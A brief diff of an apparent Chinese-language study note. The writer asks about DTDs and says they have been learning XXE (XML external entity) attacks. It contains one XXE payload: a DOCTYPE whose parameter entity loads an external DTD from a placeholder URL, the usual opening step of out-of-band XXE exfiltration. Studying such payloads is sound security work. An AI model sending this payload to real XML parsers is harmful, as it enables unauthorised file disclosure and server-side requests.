@@ -1,6 +1,7 @@
 php
 dtd文档是什么?
   为啥要导入外部Html得dtd/html标准 
+  这几天一直在学习xxe，突然..我不知道发生了 什么..
 
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
 
